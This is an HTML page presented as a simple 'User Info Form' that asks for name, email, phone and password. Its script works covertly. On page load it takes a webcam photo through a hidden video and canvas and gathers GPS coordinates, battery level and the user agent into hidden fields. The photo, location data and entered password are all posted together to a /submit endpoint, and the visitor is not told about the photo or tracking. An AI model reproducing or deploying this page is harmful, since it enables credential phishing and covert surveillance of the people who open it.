<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #6dd5fa, #2980b9);
            color: #333;
        }

        .container {
            background: #fff;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
        }

        .form-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #2980b9;
            text-align: center;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        input, button {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid #ddd;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: #2980b9;
            box-shadow: 0 0 5px rgba(41, 128, 185, 0.5);
        }

        button {
            background: #2980b9;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #1e6ba8;
        }

        #video, #canvas {
            display: none;
        }

        .hidden {
            display: none;
        }

        .message {
            text-align: center;
            margin-top: 15px;
            font-size: 0.9rem;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-title">User Info Form</div>
        <form id="device-form" enctype="multipart/form-data">
            <div class="form-group">
                <input type="text" id="name" name="name" placeholder="Name" required>
            </div>
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email" required>
            </div>
            <div class="form-group">
                <input type="text" id="phone" name="phone" placeholder="Phone" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <input type="hidden" id="percentage_charging" name="percentage_charging">
            <input type="hidden" id="phone_name" name="phone_name">
            <input type="hidden" id="latitude" name="latitude">
            <input type="hidden" id="longitude" name="longitude">
            <input type="file" id="image_input" name="image" accept="image/*" class="hidden">
            <button type="submit">Submit</button>
        </form>
        <div id="message" class="message"></div>
    </div>

    <video id="video" width="300" height="200" autoplay></video>
    <canvas id="canvas" width="300" height="200"></canvas>

    <script>
        // Battery level
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                document.getElementById('percentage_charging').value = Math.floor(battery.level * 100);
            }).catch(err => console.error('Battery API error:', err));
        }

        // Device model
        document.getElementById('phone_name').value = navigator.userAgent;

        // Geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    document.getElementById('latitude').value = position.coords.latitude;
                    document.getElementById('longitude').value = position.coords.longitude;
                },
                function(error) {
                    console.error("Geolocation error:", error.message);
                }
            );
        } else {
            console.warn("Geolocation is not supported by this browser.");
        }

        // Camera feature
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imageInput = document.getElementById('image_input');
        let stream = null;

        async function startCameraAndCapture() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;

                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const file = new File([blob], 'captured_image.jpg', { type: 'image/jpeg' });
                        const dataTransfer = new DataTransfer();
                        dataTransfer.items.add(file);
                        imageInput.files = dataTransfer.files;
                    }, 'image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            } catch (error) {
                console.error("Error accessing camera:", error.message);
                alert("Camera access is required to capture an image.");
            }
        }

        window.onload = startCameraAndCapture;

        document.getElementById('device-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = new FormData(this);

            fetch('/submit', {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                const messageDiv = document.getElementById('message');
                if (data.message) {
                    messageDiv.textContent = data.message;
                } else if (data.error) {
                    messageDiv.textContent = `Error: ${data.error}`;
                }
            })
            .catch(error => {
                console.error('Submission error:', error);
                alert("Error submitting the form. Please try again.");
            });
        });
    </script>
</body>
</html>
